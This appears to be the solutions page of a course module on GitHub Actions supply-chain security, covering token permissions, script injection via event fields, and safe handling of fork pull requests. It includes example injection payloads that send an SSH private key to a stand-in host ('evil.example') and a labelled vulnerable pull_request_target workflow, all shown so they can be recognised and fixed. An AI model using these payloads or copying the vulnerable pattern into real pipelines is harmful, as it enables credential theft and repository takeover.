# Module 24 — Solutions

![Module](https://img.shields.io/badge/Module-24-1f6feb?style=flat-square) ![Type](https://img.shields.io/badge/Type-Solutions-2da44e?style=flat-square)

> Navigation: [Course Home](../README.md) | [Solutions Index](./README.md) | [Module 24](../modules/module-24-supply-chain-security.md)

Work each lab yourself before opening the answer. The point of the lab is the
error you hit on the way, not the finished YAML.

## Quiz Answers

**1 — B.** Specifying `permissions:` with **any** key replaces the whole grant
rather than amending it, so every scope you did not name becomes `none`. Writing
`permissions: packages: write` therefore says "packages write and nothing else",
`contents` drops from `read` to `none`, and `actions/checkout` gets a `403` on the
clone. The fix is to list every scope the job needs:

```yaml
permissions:
  contents: read
  packages: write
```

**A** is a plausible-sounding invention — `checkout` needs `contents: read` and
has nothing to do with packages. **C** is false; `packages: write` is valid at
both workflow and job level. **D** is the wrong diagnosis that wastes the most
time, because the token *does* expire at job end and that fact is memorable — but
an expired token fails everything late in the run, not `checkout` at the start.
The reliable move is to read the "GITHUB_TOKEN Permissions" block that every run
log prints; it lists exactly what was granted, so there is no need to reason about
what the default would have been.

**2 — B.** `pull_request_target` runs with a **read-write** token and **full
access to repository secrets**, and it uses the base repository's workflow file.
Those properties are safe on their own, because the trigger defaults to checking
out the *base* ref — the maintainer's own code. Overriding that with
`ref: ${{ github.event.pull_request.head.sha }}` and then executing what was
checked out is the escalation: anyone who can open a pull request now runs
arbitrary code with write access and every secret. `pip install -r
requirements.txt` is enough — the attacker never has to touch a workflow file.
**A** is not exploitable: on a fork PR, `pull_request` yields a read-only token
regardless of what `permissions:` requests, and no secrets, so the declared
`contents: write` is not actually granted. **C** does not involve a fork PR at
all; `on: push` runs on branches in the base repository, which requires write
access to create. **D** is harmless — `fetch-depth: 0` fetches more history and
grants nothing.

**3 — B.** Not granting the secret is the only answer that changes what the job
*can* do. Everything else on the list changes what the job's output looks like or
who can read the repository. **A** is the important distractor: secret masking is
a **log filter**, applied to text on its way into the log. It does not stop a step
that deliberately sends the value somewhere, and it is trivially defeated by
transforming the value first — base64, reversing it, splitting it in half. Masking
is there to catch accidental disclosure, and treating it as a control is how
people justify handing secrets to jobs that run untrusted code. **C** is naming
convention, which affects nothing. **D** reduces who can read your code but does
nothing about what a workflow does with a secret once it has it; a private
repository still runs the workflows of anyone with write access.

**4.** The documented reason is loop prevention: **events triggered by
`GITHUB_TOKEN` do not start new workflow runs.** A commit pushed with the run's
own token does not fire `on: push`, a pull request opened with it does not fire
`on: pull_request`, and so on. Without that rule a workflow that commits on push
would trigger itself indefinitely, and GitHub chose to make the cycle impossible
rather than ask every author to guard against it.

You should still check the run history first, because a workflow that never
started looks exactly the same from the outside as one that started and did
nothing — and several unrelated causes present identically:

- The downstream workflow is **disabled** (manually, or automatically after 60
  days of repository inactivity for scheduled workflows).
- Its `paths:` or `branches:` filters excluded the commit.
- It has a syntax error, so GitHub never registered it.
- The push landed on a branch the trigger does not cover.

The run list distinguishes these in seconds: if there is no run, the trigger did
not fire; if there is a run that succeeded with skipped jobs, the filters or an
`if:` are responsible. Accepting the `GITHUB_TOKEN` rule without looking means
you go on to implement a workaround for a problem you do not have.

When the rule *is* the cause, the fixes are, in increasing order of privilege:
call the downstream work as a reusable workflow with `workflow_call` in the same
run; trigger it explicitly with `repository_dispatch` or `workflow_dispatch`; or,
as a last resort, push with a GitHub App installation token or a PAT, whose
events do trigger workflows — and which are also long-lived credentials you now
have to manage.

**5.** The rewrite:

```yaml
      - name: Report the branch and actor
        env:
          PR_BRANCH: ${{ github.event.pull_request.head.ref }}
          PR_ACTOR: ${{ github.actor }}
        run: |
          echo "Branch $PR_BRANCH by $PR_ACTOR"
```

What the attacker controls, precisely:

- **`github.event.pull_request.head.ref` — fully controlled.** It is a branch
  name in the attacker's own fork, and git branch names permit shell
  metacharacters. A branch named `$(curl -d @$HOME/.ssh/id_rsa evil.example)` is
  a legal branch name, and in the original step it is pasted into the script text
  before the shell parses it, so the command substitution runs. This is the live
  vector in that step.
- **`github.actor` — constrained, but not a control.** It is a GitHub login,
  which is limited to alphanumerics and hyphens, so it cannot currently carry a
  payload. That is a property of GitHub's username validation, not of your
  workflow, and it is the wrong thing to depend on: the value is still untrusted
  input, and the reviewer of your workflow should not have to know the login
  charset to judge whether the line is safe. Pass it through `env:` as well and
  the question does not arise.

Why the fix works: `${{ }}` is substituted into the script as **text** before
execution, so anything interpolated there is parsed by the shell as part of your
command. Binding the value to an environment variable moves it out of the script
text — the shell receives the variable's contents as **data** at expansion time,
and expansion does not re-parse for metacharacters. The quoting matters too:
`"$PR_BRANCH"` keeps a value containing spaces as a single word. Unquoted `$VAR`
is still word-split and glob-expanded, which is a correctness bug even when it is
not a security one.

The general rule is the one to memorise: treat every field under
`github.event.*` as hostile — titles, bodies, branch names, commit messages,
author names, label names — and never interpolate one into a `run:` block.

## Lab 1 — Beginner

**Task:** Add `permissions: {}` to a workflow, run it, and add scopes back one at
a time until `checkout` and an API call both succeed. Produce a minimal working
permission set, and a recorded `403` for each scope that was missing.

<details>
<summary>Show solution</summary>

Start from nothing and let each failure tell you what to add:

```yaml
name: Lab 24-1 Least Privilege

on: workflow_dispatch

# Stage 1: grant nothing at all. Every scope is `none`.
permissions: {}

jobs:
  probe:
    name: Find the minimal grant
    runs-on: ubuntu-latest
    steps:
      # Fails at stage 1 with a 403 on the clone.
      - name: Checkout repository
        uses: actions/checkout@v7

      # Fails until `issues: write` is granted.
      - name: Create a tracking issue
        uses: actions/github-script@v9
        env:
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        with:
          script: |
            await github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: 'Permission probe',
              body: `Created by ${process.env.RUN_URL}`,
            });

      - name: Show what the token was actually granted
        if: always()
        run: |
          echo "Read the 'GITHUB_TOKEN Permissions' block at the top of this"
          echo "job's log -- it lists the effective grant, which is the answer"
          echo "rather than the guess."
```

The finished minimal grant:

```yaml
permissions:
  contents: read      # actions/checkout
  issues: write       # issues.create
```

The record the lab asks for:

| Stage | `permissions:` | Failing step | Symptom |
| --- | --- | --- | --- |
| 1 | `{}` | `Checkout repository` | `403` on the clone; the job never reaches the API step |
| 2 | `contents: read` | `Create a tracking issue` | `403` from the REST call; checkout is fine |
| 3 | `contents: read` + `issues: write` | none | both steps succeed |

**Why this works.** The order of the failures is the lesson. `permissions: {}` is
a real, valid setting that grants nothing, and it forces each capability to be
discovered rather than assumed. Because the grant is replaced wholesale — never
merged — stage 3 has to list `contents: read` again alongside `issues: write`;
dropping it because "we already proved checkout works" reverts to stage 1's
failure. The `github-script` step passes the run URL via `env:` and reads
`process.env`, so the pattern stays consistent with the injection-safe form even
though `github.run_id` is not attacker-controlled.

**Verify the failure mode the lab asks for.** Do the stages in order and read the
`403` each time. Then do the destructive check: with the working stage-3 grant in
place, change it to just `issues: write` — the single most common real-world
mistake — and watch `checkout` fail again while the API call is unaffected. That
is quiz question 1 reproduced from the other direction, and it is the fastest way
to internalise that naming a scope zeroes the rest.

**Common wrong answer.** Granting `contents: write` because `contents: read`
"might not be enough". It is enough for `checkout`, and `write` hands the job the
ability to push to the repository, which is exactly the capability you would not
want a compromised step to have. The same reflex produces `permissions:
write-all`, which is the setting this entire module exists to argue against. Add
the narrowest scope the failure names, then stop.

</details>

## Lab 2 — Intermediate

**Task:** Find every `${{ github.event.* }}` interpolated into a `run:` block
across `examples/` and `advanced/`, and convert them to `env:` passthrough. A
grep should return no matches inside `run:` blocks, with behaviour unchanged.

<details>
<summary>Show solution</summary>

Find them first. Two passes, because one grep cannot tell a `run:` block from an
`env:` value:

```bash
# Pass 1 -- every occurrence, wherever it appears.
grep -rn '\${{ *github\.event' --include='*.yml' --include='*.yaml' examples/ advanced/

# Pass 2 -- show three lines of leading context, so an occurrence sitting under
# `env:` (safe) can be told apart from one inside a `run:` block (not safe).
grep -rn -B3 '\${{ *github\.event' --include='*.yml' --include='*.yaml' examples/ advanced/
```

The conversion, applied to each hit inside a `run:` block:

```yaml
      # BEFORE -- the title is pasted into the script text, then parsed by the
      # shell. A PR titled  "; curl evil.example/$(cat ~/.ssh/id_rsa); #
      # becomes a second command.
      - name: Report the PR
        run: |
          echo "Reviewing ${{ github.event.pull_request.title }}"
          echo "From branch ${{ github.event.pull_request.head.ref }}"

      # AFTER -- the values are bound to environment variables, so the shell
      # receives them as data. Quoted, so metacharacters and spaces are inert.
      - name: Report the PR
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BRANCH: ${{ github.event.pull_request.head.ref }}
        run: |
          echo "Reviewing $PR_TITLE"
          echo "From branch $PR_BRANCH"
```

The same rule applies to values reaching JavaScript rather than a shell:

```yaml
      - name: Comment with the PR title
        uses: actions/github-script@v9
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        with:
          # Read from process.env. Interpolating into `script:` lets a hostile
          # value break out of the JavaScript instead of the shell -- a title
          # containing a backtick or a quote is enough.
          script: |
            core.info(`Title: ${process.env.PR_TITLE}`);
```

...and to Docker build arguments, which are shell-adjacent in the same way:

```yaml
      - name: Build
        uses: docker/build-push-action@v7
        env:
          PR_BRANCH: ${{ github.event.pull_request.head.ref }}
        with:
          context: .
          push: false
          # Never inline raw event data here. See Module 23.
          build-args: |
            SOURCE_BRANCH=${{ env.PR_BRANCH }}
```

The reference implementation is the `inspect-metadata` job in
[`module-24-supply-chain-security.yml`](../examples/module-24-supply-chain-security.yml),
which binds title, branch and author to `env:` and quotes each one.

Two occurrences in this repository are deliberately left alone, and recognising
why is part of the exercise. `run-name:` and `concurrency.group:` are workflow
*properties*, not shell scripts — an event value there is a string used as a
display name or a grouping key, never executed — so
`run-name: Secure gate for PR #${{ github.event.pull_request.number || 'manual' }}`
is fine as written. Likewise an event value inside an `if:` is evaluated by the
expression engine, not a shell. The rule is specifically about places where the
value becomes part of a *script*.

**Why this works.** `${{ }}` is resolved by the runner during step preparation,
before the shell or Node ever starts, and the result is pasted into the script as
literal text. So an interpolated value is code by construction. `env:` breaks that
chain: the value is set as a process environment variable, and `$VAR` expansion
happens inside the already-parsed script, where the expanded text is data and is
not re-scanned for operators. Quoting closes the remaining gap — unquoted `$VAR`
is still subject to word splitting and globbing.

**Verify the failure mode the lab asks for.** Prove the vulnerability on a branch
you control, in a repository you own. Restore one `run:` interpolation, open a PR
whose title is `x"; echo INJECTED; #`, and watch `INJECTED` appear in the job log
as its own command — the step's own `echo` will have been truncated at the quote.
Convert that step to `env:`, retitle nothing, and re-run: the log now prints the
literal string including the quote and semicolon. Same input, same workflow, one
line different.

**Common wrong answer.** Sanitising the value instead of moving it — stripping
quotes, or wrapping the interpolation in single quotes as
`run: echo '${{ github.event.pull_request.title }}'`. The single-quote version
fails the moment the title itself contains a single quote, which closes the quote
early and puts the rest of the title back into command position. You cannot fix
this by escaping, because you are escaping *after* the substitution has already
happened. The value has to leave the script text entirely.

</details>

## Lab 3 — Challenge

**Task:** Write two workflows that together test fork PRs safely: one
`pull_request` job that runs the suite without secrets, and one
`pull_request_target` job that comments without checking out the head. Document
why the split is required.

<details>
<summary>Show solution</summary>

Workflow one — runs the untrusted code, holds nothing worth stealing:

```yaml
# .github/workflows/lab-24-3-test.yml
#
# Runs the contributor's code. Deliberately powerless: `pull_request` gives a
# fork PR a read-only token and NO secrets, whatever this file requests.
name: Lab 24-3 Test PR Code

on:
  pull_request:

permissions:
  contents: read

concurrency:
  group: lab-24-3-test-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  test:
    name: Run the smoke suite
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v7

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: "3.13"

      - name: Install suite dependencies
        working-directory: your-solution-root-folder-name
        run: |
          pip install --disable-pip-version-check -r requirements.txt

      - name: Lint
        working-directory: your-solution-root-folder-name
        run: pylint --fail-under=9.0 features/

      # A fork PR has no secrets, so the suite MUST be runnable without them.
      # A mock backend is what makes that possible. If the tests needed real
      # credentials there would be no safe way to run fork PRs at all.
      - name: Run the smoke suite against a mock backend
        working-directory: your-solution-root-folder-name
        env:
          BASE_URL: http://localhost:8080
        run: |
          behave --tags=smoke \
            -f allure_behave.formatter:AllureFormatter \
            -o reports/allure-results

      # The results leave this job as an artifact, which is the only channel
      # available: this job cannot comment, and must not be able to.
      - name: Upload Allure results
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: allure-pr-smoke
          path: your-solution-root-folder-name/reports/allure-results/
          retention-days: 7
          if-no-files-found: warn
```

Workflow two — holds write access, never touches the contributor's code:

```yaml
# .github/workflows/lab-24-3-comment.yml
#
# Metadata only. This workflow has a read-WRITE token and access to secrets, so
# the single rule it must never break is: no checkout of the PR head, and no
# execution of anything the contributor wrote.
name: Lab 24-3 Comment On PR

on:
  pull_request_target:
    types: [opened, reopened, synchronize]

permissions:
  pull-requests: write

concurrency:
  group: lab-24-3-comment-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  comment:
    name: Post the review checklist
    runs-on: ubuntu-latest
    steps:
      # NOTE THE ABSENCE OF A CHECKOUT. Not "a checkout of the base ref" -- no
      # checkout at all. Nothing the contributor authored reaches this runner,
      # so there is nothing on it that could use the write token.
      - name: Post a checklist comment
        uses: actions/github-script@v9
        env:
          # Attacker-controlled values arrive via env and are read from
          # process.env, never interpolated into this script.
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
        with:
          script: |
            const body = [
              '### Review checklist',
              '',
              `- Title: ${process.env.PR_TITLE}`,
              `- Author: ${process.env.PR_AUTHOR}`,
              '- [ ] Smoke suite green in the `Lab 24-3 Test PR Code` run',
              '- [ ] No new secrets committed',
              '- [ ] Any new third-party action is SHA-pinned',
            ].join('\n');
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.payload.pull_request.number,
              body,
            });
```

The written explanation the lab asks for:

> **Why the split is required.** The two workflows need mutually exclusive
> things. Running the contributor's tests requires *executing untrusted code*.
> Commenting on the pull request requires a *write-scoped token*. A fork PR
> cannot be given both, because a token that can write is a token that untrusted
> code can use.
>
> `on: pull_request` supplies the first half. For a PR from a fork it hands the
> job a read-only token and no secrets at all, and it does so regardless of what
> the workflow's `permissions:` block requests — the trigger, not the file, is
> what enforces it. That is why the test workflow can safely check out and run
> the head: there is nothing on the runner worth stealing.
>
> `on: pull_request_target` supplies the second half. It runs the base
> repository's workflow file with a read-write token and full secret access, and
> it defaults to checking out the base ref. Those properties are safe *only*
> while the workflow never executes contributor code. The single change that
> turns it into a full repository compromise is adding
> `ref: ${{ github.event.pull_request.head.sha }}` to a checkout and then running
> anything from that tree — `pip install -r requirements.txt` is sufficient,
> because the attacker controls `requirements.txt`, and they never have to touch
> a workflow file to do it.
>
> The boundary is therefore structural, not a setting. Each capability lives in
> a separate workflow, and the privileged one has no checkout step to subvert.
> Merging them into one workflow — even with two jobs and careful per-job
> `permissions:` — reintroduces the risk, because both jobs then run from a
> single trigger and only one of the two triggers has the safe token semantics.

For reference, the vulnerable shape, so you can recognise it in a review:

```yaml
# VULNERABLE -- do not copy. Read-write token, every secret, attacker's code.
name: Do Not Copy

on: pull_request_target

permissions:
  contents: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: pip install -r requirements.txt               # ...now executed
```

**Why this works.** The safety property is that no runner ever holds both
untrusted code and a useful credential at the same time. The test workflow has
the code and no credential; the comment workflow has the credential and no code.
Results cross the boundary as *data* — an artifact, or a check-run conclusion
read through the API — never as code. `permissions:` on each workflow is a second
layer that limits the damage if the first assumption is ever wrong, which is why
the comment workflow requests `pull-requests: write` and not `contents: write`.

**Verify the failure mode the lab asks for.** Two checks, both non-destructive.
First, in the test workflow, add a step that prints whether a secret is present —
without printing the secret — for example `run: test -n "$MY_SECRET" && echo
present || echo absent` with `MY_SECRET: ${{ secrets.SOME_SECRET }}` in `env:`.
Open a PR from a fork and confirm it reports `absent`; open one from a branch in
the base repository and confirm it reports `present`. That difference *is* the
fork boundary, and seeing it removes any doubt about whether `permissions:` was
what protected you. Second, remove `pull-requests: write` from the comment
workflow and confirm `createComment` fails with a `403`, which proves the scope is
load-bearing rather than decorative.

**Common wrong answer.** Using `workflow_run` to "safely" pick up after the test
workflow and then checking out the head SHA there. A `workflow_run` workflow runs
from the default branch with a write token and secrets, exactly like
`pull_request_target` — running *later* is not a privilege boundary. The
consuming workflow may download the first run's artifacts, but it must treat
their contents as untrusted data and must never check out or execute the head.

The other frequent wrong answer is `if: github.event.pull_request.head.repo.full_name == github.repository`
as a guard on a `pull_request_target` job that checks out the head. It does block
fork PRs, but it also means the job never runs for the contributors it was
written for, so the tests it guards provide no coverage where it matters — and the
guard is one careless edit away from being removed by someone who notices the
same thing.

</details>

---

[Solutions Index](./README.md) | [Module 24](../modules/module-24-supply-chain-security.md) | [Course Home](../README.md)
